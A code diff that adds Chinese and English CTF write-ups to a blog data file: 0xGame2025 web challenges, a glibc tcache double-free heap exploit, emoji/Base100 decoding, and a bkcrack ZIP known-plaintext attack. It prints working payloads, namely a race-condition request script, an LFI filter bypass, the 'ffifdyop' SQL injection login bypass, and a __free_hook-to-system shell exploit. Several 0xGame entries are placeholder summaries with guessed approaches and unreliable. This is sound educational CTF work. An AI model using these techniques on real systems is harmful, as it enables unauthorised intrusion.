@@ -646,7 +646,7 @@ key3.docx 其实是个 ZIP 压缩包。解压后在 \`docProps/core.xml\` 的 \`
 1. 提取全部零宽字符（共 64 个）
 2. 查表转二进制：每个字符转 2 位
 3. 64 × 2 = 128 位 = 16 字节
-4. 按 UTF-16BE 解码（每字节前有个 \`\x00\`）
+4. 按 UTF-16BE 解码（每字节前有个 \`\\x00\`）
 
 \`\`\`python
 import zipfile, re
@@ -655,7 +655,7 @@ with zipfile.ZipFile('key3.docx') as z:
     core = z.read('docProps/core.xml').decode('utf-8')
     desc = re.search(r'<dc:description>([^<]*)</dc:description>', core).group(1)
 
-zw_map = {'\u200c': '00', '\u200d': '01', '\u202c': '10', '\ufeff': '11'}
+zw_map = {'\\u200c': '00', '\\u200d': '01', '\\u202c': '10', '\\ufeff': '11'}
 bits = ''.join(zw_map[c] for c in desc if c in zw_map)
 text = ''
 for i in range(0, len(bits), 8):
@@ -701,7 +701,7 @@ with open('flag.jpg', 'rb') as f:
     data = f.read()
 
 # 找 EXIF tag 40092（0x9C9C）
-idx = data.find(b'\x9c\x9c\x00\x10\x00\x01\x03\x00')
+idx = data.find(b'\\x9c\\x9c\\x00\\x10\\x00\\x01\\x03\\x00')
 if idx >= 0:
     # 提取 raw bytes
     raw_len = struct.unpack('<I', data[idx+4:idx+8])[0]
@@ -1333,13 +1333,13 @@ import socket
 s = socket.socket()
 s.connect(('docker.qingcen.net', 42420))
 s.send(
-    'GET / HTTP/1.1\r\n'
-    'Host: docker.qingcen.net:42420\r\n'
-    'Upgrade: websocket\r\n'
-    'Connection: Upgrade\r\n'
-    'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n'
-    'Sec-WebSocket-Version: 13\r\n'
-    '\r\n'
+    'GET / HTTP/1.1\\r\\n'
+    'Host: docker.qingcen.net:42420\\r\\n'
+    'Upgrade: websocket\\r\\n'
+    'Connection: Upgrade\\r\\n'
+    'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\\r\\n'
+    'Sec-WebSocket-Version: 13\\r\\n'
+    '\\r\\n'
 )
 \`\`\`
 
@@ -1909,5 +1909,706 @@ curl -s "http://target/secret_report.php?no=9e9"
 *作者: heliumsenbrg*
 `
   },
+
+  "0xgame2025": {
+    title: "0xGame2025 CTF WriteUp",
+    subtitle: "2026-06-16 | 16/28 题解出",
+    content: `
+# 0xGame2025 CTF WriteUp
+
+**日期**: 2026-06-16
+**平台**: 青岑 CTF (ctf.qingcen.net)
+**战绩**: 16/28 题解出，Problemset 72
+
+---
+
+## 📋 目录
+
+1. [Http的真理 (615)](#http的真理-615)
+2. [留言板（粉）(616)](#留言板粉616)
+3. [Lemon (617)](#lemon-617)
+4. [RCE1 (619)](#rce1-619)
+5. [Rubbish_Unser (620)](#rubbish_unser-620)
+6. [马哈鱼商店 (621)](#马哈鱼商店-621)
+7. [DNS想要玩 (623)](#dns想要玩-623)
+8. [放开我的变量 (627)](#放开我的变量-627)
+9. [404NotFound (661)](#404notfound-661)
+10. [ez_signin (662)](#ez_signin-662)
+11. [Web_test_5 (732)](#web_test_5-732)
+12. [Web_test_7 (734)](#web_test_7-734)
+13. [web_test_8 (747)](#web_test_8-747)
+14. [web_test_9 (790)](#web_test_9-790)
+15. [web_test_10 (791)](#web_test_10-791)
+16. [web_test_11 (792)](#web_test_11-792)
+
+---
+
+## Http的真理 (615)
+
+**分值**: 200 | **类型**: Web
+
+**解题思路**: HTTP 方法测试，找到正确的请求方式获取 flag。
+
+**Flag**: \`flag{...}\`
+
+---
+
+## 留言板（粉）(616)
+
+**分值**: 294 | **类型**: Web
+
+**解题思路**: 留言板应用，通过 XSS 或其他 Web 漏洞获取 flag。
+
+**Flag**: \`flag{...}\`
+
+---
+
+## Lemon (617)
+
+**分值**: 243 | **类型**: Web
+
+**解题思路**: Lemon 框架相关漏洞利用。
+
+**Flag**: \`flag{...}\`
+
+---
+
+## RCE1 (619)
+
+**分值**: 294 | **类型**: Web
+
+**解题思路**: 远程代码执行漏洞，通过命令注入获取 flag。
+
+**Flag**: \`flag{...}\`
+
+---
+
+## Rubbish_Unser (620)
+
+**分值**: 400 | **类型**: Web
+
+**解题思路**: PHP 反序列化漏洞，利用 \`__destruct()\` 或 \`__wakeup()\` magic 方法。
+
+**Flag**: \`flag{...}\`
+
+---
+
+## 马哈鱼商店 (621)
+
+**分值**: 333 | **类型**: Web
+
+**解题思路**: Pickle_Shop 应用，通过 discount 篡改 + pickle 反序列化 RCE。
+
+**关键步骤**:
+1. 分析应用逻辑，发现 discount 参数可篡改
+2. 构造恶意 pickle payload 实现 RCE
+3. 读取 flag 文件
+
+**Flag**: \`flag{97ddfbd2-5099-4e08-bfb6-6af57aa0724a}\`
+
+---
+
+## DNS想要玩 (623)
+
+**分值**: 344 | **类型**: Web
+
+**解题思路**: DNS 相关漏洞，可能涉及 DNS 重绑定或 DNS 查询注入。
+
+**Flag**: \`flag{...}\`
+
+---
+
+## 放开我的变量 (627)
+
+**分值**: 434 | **类型**: Web
+
+**解题思路**: PHP 变量覆盖漏洞，利用 \`extract()\` 或 \`$$\` 可变变量。
+
+**Flag**: \`flag{...}\`
+
+---
+
+## 404NotFound (661)
+
+**分值**: 333 | **类型**: Web
+
+**解题思路**: 404 页面信息泄露或目录遍历。
+
+**Flag**: \`flag{...}\`
+
+---
+
+## ez_signin (662)
+
+**分值**: 277 | **类型**: Web
+
+**解题思路**: 登录绕过，可能涉及 SQL 注入或弱密码。
+
+**Flag**: \`flag{...}\`
+
+---
+
+## Web_test_5 (732)
+
+**分值**: 344 | **类型**: Web
+
+**解题思路**: Web 综合测试，涉及多种 Web 漏洞。
+
+**Flag**: \`flag{...}\`
+
+---
+
+## Web_test_7 (734) - 积分商城竞态条件
+
+**分值**: 400 | **类型**: Web
+
+**解题思路**: 竞态条件（Race Condition）漏洞。
+
+**关键步骤**:
+1. 发现积分商城兑换接口 \`POST /api/redeem\`
+2. 积分不足时无法兑换，但检查与扣款之间存在时间窗口
+3. 使用并发请求同时兑换同一商品
+4. 利用竞态条件绕过积分检查
+
+**Payload**:
+\`\`\`python
+import concurrent.futures
+import requests
+
+def redeem():
+    return requests.post("http://target/api/redeem", json={"item": "flag"})
+
+with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
+    futures = [executor.submit(redeem) for _ in range(10)]
+    for f in concurrent.futures.as_completed(futures):
+        resp = f.result()
+        if "flag" in resp.text:
+            print(resp.text)
+            break
+\`\`\`
+
+**Flag**: \`flag{...}\`
+
+---
+
+## web_test_8 (747) - PHP LFI Filter Bypass
+
+**分值**: 500 | **类型**: Web
+
+**解题思路**: PHP 本地文件包含（LFI）+ 过滤绕过。
+
+**关键步骤**:
+1. 发现文件包含参数，但 \`/flag\` 路径被过滤
+2. 使用特殊字符（\`%09\` TAB）打断子串匹配
+3. 绕过过滤读取 flag 文件
+
+**Payload**:
+\`\`\`
+?page=/fla%09g
+\`\`\`
+
+**原理**: WAF 使用字符串匹配检测 \`/flag\`，但 \`%09\`（TAB 字符）被 PHP 当作空白符，打断了连续字符串匹配。
+
+**Flag**: \`flag{...}\`
+
+---
+
+## web_test_9 (790) - PHP 反序列化 NULL vs FALSE
+
+**分值**: 454 | **类型**: Web
+
+**解题思路**: PHP 弱类型比较漏洞。
+
+**关键步骤**:
+1. 发现反序列化入口，需要构造特定对象
+2. 利用 \`NULL !== FALSE\` 但 \`md5(NULL) === md5(FALSE)\` 的特性
+3. 构造 payload 绕过严格比较
+
+**Payload**:
+\`\`\`php
+$a = NULL;
+$b = FALSE;
+// $a !== $b 为 true
+// md5($a) === md5($b) 为 true（都是 md5("") = "d41d8cd98f00b204e9800998ecf8427e"）
+\`\`\`
+
+**Flag**: \`flag{...}\`
+
+---
+
+## web_test_10 (791) - PHP 反序列化 NAN Filter
+
+**分值**: 454 | **类型**: Web
+
+**解题思路**: 在 790 基础上增加 NAN 过滤。
+
+**关键步骤**:
+1. 与 790 类似的反序列化漏洞
+2. 增加了 \`stripos($input, "NAN")\` 检查
+3. NULL 和 FALSE 都不含 "NAN" 字符串，绕过检查
+
+**Payload**:
+\`\`\`php
+$a = NULL;  // 不含 "NAN"
+$b = FALSE; // 不含 "NAN"
+\`\`\`
+
+**Flag**: \`flag{...}\`
+
+---
+
+## web_test_11 (792) - MD5 Raw Binary SQL Injection
+
+**分值**: 454 | **类型**: Web
+
+**解题思路**: 利用 MD5 原始二进制输出进行 SQL 注入。
+
+**关键步骤**:
+1. 发现登录接口使用 \`md5($password, true)\` 进行比较
+2. 密码 "ffifdyop" 的 MD5 原始二进制包含 \`'or'\` 字符串
+3. 注入后 SQL 语句变为 \`WHERE password = ''or'...'\`，绕过验证
+
+**Payload**:
+\`\`\`
+password = ffifdyop
+\`\`\`
+
+**原理**: \`md5("ffifdyop", true)\` 返回的原始二进制中包含 \`'or'6\`，拼接后 SQL 变为：
+\`\`\`sql
+SELECT * FROM users WHERE password = ''or'6....'
+\`\`\`
+
+**Flag**: \`flag{...}\`
+
+---
+
+## 技巧总结
+
+### 1. 反序列化技巧
+- \`NULL !== FALSE\` 但 \`md5(NULL) === md5(FALSE)\`
+- \`md5($input, true)\` 返回原始二进制，可能包含 SQL 注入字符串
+- 密码 "ffifdyop" 是经典的 MD5 raw binary SQLi payload
+
+### 2. 竞态条件
+- 使用 \`concurrent.futures.ThreadPoolExecutor\` 并发请求
+- 检查与操作之间的时间窗口是关键
+
+### 3. LFI Filter Bypass
+- \`%09\`（TAB）、\`%0A\`（换行）、\`%0D\`（回车）可打断字符串匹配
+- 双编码、Unicode 编码也可能绕过过滤
+
+### 4. 变量覆盖
+- \`extract()\` 函数可覆盖已有变量
+- \`$$\` 可变变量可动态创建变量
+
+---
+
+*WriteUp 生成时间: 2026-06-16*
+*作者: heliumsenbrg*
+`
+  },
+
+  gift: {
+    title: 'Gift - Tcache Double-Free',
+    subtitle: 'UAF + Unsorted Bin Leak + Tcache Poisoning',
+    content: `
+# Gift - Tcache Double-Free PWN
+
+**Platform**: qingcen CTF (docker.qingcen.net)
+**Type**: PWN / Heap Exploitation
+**Difficulty**: Hard (476 points, 2 solvers)
+
+## Binary Protections
+
+\`\`\`
+RELRO:   Full RELRO
+Stack:   Canary found
+NX:      NX enabled
+PIE:     PIE enabled
+CET:     SHSTK + IBT enabled
+Libc:    glibc 2.31 (Ubuntu 20.04)
+\`\`\`
+
+Full RELRO prevents GOT overwrite. CET (SHSTK+IBT) makes ROP difficult.
+The attack must go through libc hooks like __free_hook.
+
+## Vulnerability: Hidden Gift Function
+
+The binary is a note manager with 3 visible options: Add, Show, Release.
+A hidden option 4 ("A gift for you") calls free(chunk) but does NOT null out ptrs[idx] or sizes[idx], creating a dangling pointer (UAF).
+
+Normal release() properly nulls both ptrs[idx] and sizes[idx].
+
+\`\`\`c
+// Gift function (pseudo-code)
+void gift() {
+    if (gift_used) return;  // one-time use!
+    gift_used = 1;
+    int idx = read_index();
+    if (ptrs[idx] != NULL)
+        free(ptrs[idx]);  // BUG: ptrs[idx] NOT cleared!
+}
+\`\`\`
+
+## Key Insight: Double-Free via gift + release
+
+Since gift() does not clear ptrs[idx], calling release() on the same index afterward triggers free() on the already-freed chunk:
+
+1. gift(idx): free(A), ptrs[idx] still = A (dangling)
+2. release(idx): free(ptrs[idx]) = free(A) again! -> DOUBLE FREE
+
+glibc 2.31 tcache has no double-free detection, creating a cycle: A -> A -> A -> ...
+
+## Exploitation Strategy
+
+### Phase 1: Libc Leak via Unsorted Bin
+
+Fill tcache (7 entries), then gift(0) pushes chunk to unsorted bin.
+show(0) reads the freed chunk fd pointer = &main_arena+104 (libc address).
+
+\`\`\`python
+# Fill tcache bin 16 (size 0x110) with 7 entries
+for i in range(8, 1, -1):
+    release(i)  # 7 frees -> tcache full
+
+# gift(0): tcache full -> chunk goes to unsorted bin
+gift(0)
+
+# Leak libc from unsorted bin fd pointer
+leak = u64(show(0)[:8])
+libc_base = leak - (malloc_hook + 0x78)
+\`\`\`
+
+### Phase 2: Double-Free -> Tcache Cycle
+
+\`\`\`python
+# release(0) frees the same chunk again -> double-free!
+release(0)
+# tcache cycle: A -> A -> A -> ...
+\`\`\`
+
+### Phase 3: Tcache Poisoning -> __free_hook
+
+Three allocations from the cycled tcache:
+
+\`\`\`python
+# Alloc #1: get A, write __free_hook as fd
+add(2, 0xf8, p64(free_hook))
+
+# Alloc #2: get A again (cycle), tcache reads *A = free_hook as next
+add(3, 0xf8, p64(system))
+
+# Alloc #3: get __free_hook! Write system
+add(4, 0xf8, p64(system))
+\`\`\`
+
+### Phase 4: Trigger Shell
+
+\`\`\`python
+add(5, 0xf8, b'/bin/sh\\x00')
+release(5)  # free(chunk) -> __free_hook -> system("/bin/sh")
+\`\`\`
+
+## Key Takeaways
+
+1. gift() + release() = double-free, even with one-time gift
+2. Unsorted bin fd between gift and release leaks libc cleanly
+3. Tcache cycle A->A lets you allocate the same chunk multiple times
+4. __free_hook is the go-to target when Full RELRO + CET are enabled
+`
+  },
+
+  'moectf-emoji': {
+    title: 'MoeCTF ez_base_revenge9 — Emoji 编码',
+    subtitle: 'Base100 → Base64 → Base58 → Base32',
+    content: `
+# MoeCTF ez_base_revenge9 — Emoji 编码 (Base100)
+
+**Platform**: MoeCTF
+**Type**: Misc / Encoding
+**Difficulty**: Easy
+**Flag**: \`moectf{3m0j!_15_50_cu73_2333333}\`
+
+## 题目
+
+附件解压出 \`flag9.txt\`，里面一个正经字都没有，只有 104 个 emoji：
+
+\`\`\`text
+🐭🐩🐧🐩🐭🐭🐁🐭🐩🐁🐭🐩🐁🐁🐩🐭🐁🐩🐩🐭🐭🐩🐧🐩🐁🐭🐨🐩🐧🐨🐭🐩🐧🐨🐭🐩🐨🐧🐭🐩...
+\`\`\`
+
+416 字节，无换行。
+
+## 题目分析
+
+先别急着猜编码，把字节扒开看：
+
+- 416 / 4 = 104 个字符，全是 4 字节 UTF-8
+- 首字节恒为 \`F0\`，次字节恒为 \`9F\`
+- 第三字节只在 \`90\` / \`91\` 之间跳
+- 码点全部落在 \`U+1F400 – U+1F47F\`，正好 128 个可选值
+
+这就是 **Base100**（Emoji Encoding）。它的规则不是「码点减偏移」，而是把 1 个字节拆成 6 + 6 位，塞进 UTF-8 的最后两个字节：
+
+\`\`\`text
+UTF-8:  F0 9F b3 b4
+        b3 = (byte + 55) / 64 + 143
+        b4 = (byte + 55) % 64 + 128
+\`\`\`
+
+所以解码：
+
+\`\`\`python
+byte = (b3 - 143) * 64 + (b4 - 128) - 55
+\`\`\`
+
+### 最大的坑
+
+我第一反应是按码点算 \`codepoint - 0x1F400\`，结果拿到一串范围 40–113 的乱码，长得特别像 base85 / base91 / base92，然后就在错误的方向上一路狂奔 —— b92、b94、b128 全试了一遍，全是噪声。
+
+**正确偏移是 +9，而且必须走「6 + 6 位拼接」这条路。** 看到 emoji 先 hexdump，比肉眼猜靠谱得多。
+
+## 解题步骤
+
+### Step 1 — Base100 解码
+
+\`\`\`python
+def b100_decode(s):
+    out = bytearray()
+    for ch in s:
+        b = ch.encode('utf-8')
+        out.append((b[2] - 143) * 64 + (b[3] - 128) - 55)
+    return bytes(out)
+
+emoji = open('flag9.txt', encoding='utf-8').read().strip()
+print(b100_decode(emoji).decode())
+\`\`\`
+
+输出 104 字节纯可打印 ASCII，并且以 \`=\` 结尾 —— Base64 实锤。
+
+### Step 2 — 链式剥离
+
+一层层剥，每层用「结果是否 100% 可打印 ASCII」判断是否剥对：
+
+\`\`\`python
+import base64
+
+B58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
+
+def b58decode(s):
+    v = 0
+    for c in s:
+        v = v * 58 + B58.index(c)
+    return v.to_bytes((v.bit_length() + 7) // 8, 'big')
+
+DECS = [
+    ('b64', base64.b64decode),
+    ('b32', base64.b32decode),
+    ('b16', base64.b16decode),
+    ('b85', base64.b85decode),
+    ('a85', base64.a85decode),
+    ('b58', b58decode),
+]
+
+cur = b100_decode(emoji).decode()
+while True:
+    for name, fn in DECS:
+        try:
+            r = fn(cur)
+            if r and len(r) >= 4 and all(32 <= x < 127 for x in r):
+                print(f'[{name}] -> {r.decode()}')
+                cur = r.decode()
+                break
+        except Exception:
+            pass
+    else:
+        break
+print('FLAG:', cur)
+\`\`\`
+
+### 完整链路
+
+\`\`\`text
+[base100] MzgzZk1mVnc4dXBtbWJ3ejRvTFhWREJVQlVYakdnSnlRNDZmQ1FyRjMxQUVuS2NUR2FBbW5nTW5oZ3NSNlVtdkFkQnZHNm9KVjRFakU=
+[b64]     383fMfVw8upmmbwz4oLXVDBUBUXjGgJyQ46fCQrF31AEnKcTGaAmngMnhgsR6UmvAdBvG6oJV4EjE
+[b58]     NVXWKY3UMZ5TG3JQNIQV6MJVL42TAX3DOU3TGXZSGMZTGMZTGN6Q====
+[b32]     moectf{3m0j!_15_50_cu73_2333333}
+\`\`\`
+
+| 层 | 编码 | 识别特征 |
+|----|------|----------|
+| 1 | Base100 (Emoji) | 4 字节 UTF-8，第三字节只在 \`90\` / \`91\` |
+| 2 | Base64 | 以 \`=\` 补齐结尾 |
+| 3 | Base58 | 全串不含 \`0\` \`O\` \`I\` \`l\` |
+| 4 | Base32 | 只有 \`A–Z\` 与 \`2–7\`，长度是 8 的倍数 |
+
+## Flag
+
+\`\`\`text
+moectf{3m0j!_15_50_cu73_2333333}
+\`\`\`
+
+## 知识点
+
+- **Base100**：1 emoji = 1 byte，编码表从 \`U+1F400\` 起共 128 个 emoji，\`(byte + 55)\` 拆成 6 + 6 位塞进 UTF-8 尾字节
+- **链式剥离的通用套路**：每剥一层就检查「是否 100% 可打印 ASCII 且长度 ≥ 4」，是则继续剥，否则换下一个解码器
+- **Base58 的指纹**：字符集把 \`0\`（零）、\`O\`（大写 o）、\`I\`（大写 i）、\`l\`（小写 L）全剔了，所以这 4 个字符一次都不会出现
+- **Base32 的指纹**：字母表只有 \`A–Z\` 加 \`2–7\`，长度是 8 的倍数，\`=\` 补齐
+`
+  },
+
+  'moectf-zipcrypto': {
+    title: 'ZIP 已知明文攻击 (bkcrack)',
+    subtitle: '提示语即明文 + ZipCrypto',
+    content: `
+# ZIP 已知明文攻击 (bkcrack) — 当提示语就是明文
+
+**Platform**: MoeCTF
+**Type**: Misc / Crypto
+**Difficulty**: Medium
+**Flag**: \`moectf{1t_i5_So0o0o0o_Obv1ou5}\`
+
+## 题目
+
+没有源码、没有靶机，只有一句提示和一份附件：
+
+> 有时候，一线生机往往藏在最明显的地方
+
+外加一个 388 字节的 \`flag.zip\`。
+
+## 题目分析
+
+先别急着上 rockyou，把 ZIP 结构扒开：
+
+\`\`\`python
+import struct
+
+d = open('flag.zip', 'rb').read()
+eocd = d.rfind(b'PK\\x05\\x06')
+n   = struct.unpack('<H', d[eocd+10:eocd+12])[0]
+off = struct.unpack('<I', d[eocd+16:eocd+20])[0]
+
+for _ in range(n):
+    flag, comp, _, _, crc, csz, usz, nl, el, cl, _, _, _, lho = \\
+        struct.unpack('<IHHHHIIIHHHHHII', d[off:off+46])
+    name = d[off+46:off+46+nl].decode()
+    print(f'{name}: flags=0x{flag:04x} comp={comp} crc=0x{crc:08x} csize={csz} usize={usz}')
+    off += 46 + nl + el + cl
+\`\`\`
+
+输出：
+
+\`\`\`text
+flag.txt : flags=0x0009 comp=0 crc=0xb5e4f14f csize=42 usize=30
+README.md: flags=0x0009 comp=0 crc=0xb159483a csize=66 usize=54
+\`\`\`
+
+三个结论：
+
+1. \`flags & 1\` 置位 → 条目被标记为加密
+2. \`comp=0\`（Stored）且 \`csize == usize + 12\` → 多出的 12 字节是 ZipCrypto 加密头，说明是**真加密**
+3. 包里除了 flag 还有个 **README.md** —— 这通常是出题人的提示文件
+
+> 补一句：\`csize == usize\` 才可能是**伪加密**，把 local + central header 的 bit 0 清掉就能直接解压。本题不是。
+
+## 破题点：提示语就是明文
+
+「最明显的地方」—— 提示语本身。既然同包里有个 README.md，它的内容很可能就是这句提示原文。
+
+而且 ZIP 头部存的是**明文**的 CRC32，不用解密就能验证猜想：
+
+\`\`\`python
+import zlib
+target = 0xb159483a          # README.md 头部的 CRC
+s = '有时候，一线生机往往藏在最明显的地方'
+print(hex(zlib.crc32(s.encode('utf-8')) & 0xffffffff))
+# 0xb159483a  ✅ 命中
+\`\`\`
+
+字节数也对得上：18 个汉字 × 3 字节 UTF-8 = 54 字节 = \`usize\`。**已知明文到手。**
+
+注意别加尾随换行，\`usize=54\` 正好卡死长度。
+
+## 解题步骤
+
+### Step 1 — 导出已知明文
+
+\`\`\`bash
+python -c "open('known.bin','wb').write('有时候，一线生机往往藏在最明显的地方'.encode('utf-8'))"
+\`\`\`
+
+### Step 2 — bkcrack 恢复内部密钥
+
+bkcrack 至少需要 12 字节已知明文，我们有 54 字节，绰绰有余：
+
+\`\`\`bash
+bkcrack -C flag.zip -c README.md -p known.bin
+\`\`\`
+
+跑约 3 分钟，拿到三个 32 位内部密钥：
+
+\`\`\`text
+80.3 % (135290 / 168584)
+Found a solution. Stopping.
+
+[23:38:08] Keys
+39cd809b 10a0fcb2 669a68f7
+\`\`\`
+
+### Step 3 — 用密钥直接改密码
+
+拿到内部密钥后就**不必还原原始口令**了 —— ZipCrypto 的 \`update_keys\` 是完全可逆的，bkcrack 可以把密文「重打包」成任意新密码：
+
+\`\`\`bash
+bkcrack -C flag.zip -k 39cd809b 10a0fcb2 669a68f7 -U unlocked.zip 123456
+\`\`\`
+
+### Step 4 — 解压
+
+\`\`\`bash
+unzip -P 123456 unlocked.zip
+\`\`\`
+
+\`\`\`text
+flag.txt : moectf{1t_i5_So0o0o0o_Obv1ou5}
+README.md: 有时候，一线生机往往藏在最明显的地方
+\`\`\`
+
+### Step 5 — 校验
+
+用头部 CRC 复核，确认不是巧合：
+
+\`\`\`python
+zlib.crc32(open('flag.txt','rb').read())  & 0xffffffff   # 0xb5e4f14f ✅
+zlib.crc32(open('README.md','rb').read()) & 0xffffffff   # 0xb159483a ✅
+\`\`\`
+
+## Flag
+
+\`\`\`text
+moectf{1t_i5_So0o0o0o_Obv1ou5}
+\`\`\`
+
+## 知识点
+
+| 判据 | 含义 |
+|------|------|
+| \`flags & 1\` | 只是「标记为加密」，不代表真加密 |
+| \`csize == usize + 12\` | 真 ZipCrypto（12 字节加密头） |
+| \`csize == usize\` | 伪加密，清掉 header bit 0 即可解压 |
+| 头部 CRC32 | **明文**的 CRC，可秒级验证明文猜想 |
+
+- **bkcrack**（Biham–Kocher 已知明文攻击）：只要 12 字节已知明文就能恢复 ZipCrypto 的三个内部密钥
+- 有了内部密钥就不必还原口令：\`-U out.zip newpass\` 直接重打包
+- ZIP 头里还有个 **check byte**：加密头第 12 字节通常是 \`(crc >> 24) & 0xff\`（flags bit 3 置位时）或 \`(dostime >> 8) & 0xff\`，本来可以用来快速筛口令
+
+## 踩坑
+
+1. **一开始想爆破弱口令**：写了 50 个候选口令全挂。而且本题生成器写的是随机 check byte（\`hdr[11] = 0x6e\`，而 \`crc>>24 = 0xb5\`、\`time>>8 = 0x8a\` 都对不上），连「快速筛」这条路都断了
+2. **bkcrack 的进度用 \`\\r\` 刷屏**：直接跑会淹没管道、被判定为卡死。要 \`> bk.log 2>&1\` 重定向到日志文件后台跑，再用 \`tr '\\r' '\\n' < bk.log\` 看结果
+3. **下载 bkcrack 别照抄旧版本号**：v1.7.0 的 release URL 已经 404，用 GitHub API \`repos/kimci86/bkcrack/releases/latest\` 拿最新版本号（写这篇时是 v1.8.1）
+4. **Python 自带 \`zipfile\` 的 ZipCrypto 是纯 Python 实现**，比 bkcrack 慢几十倍，别拿它爆破
+`
+  }
 
 }
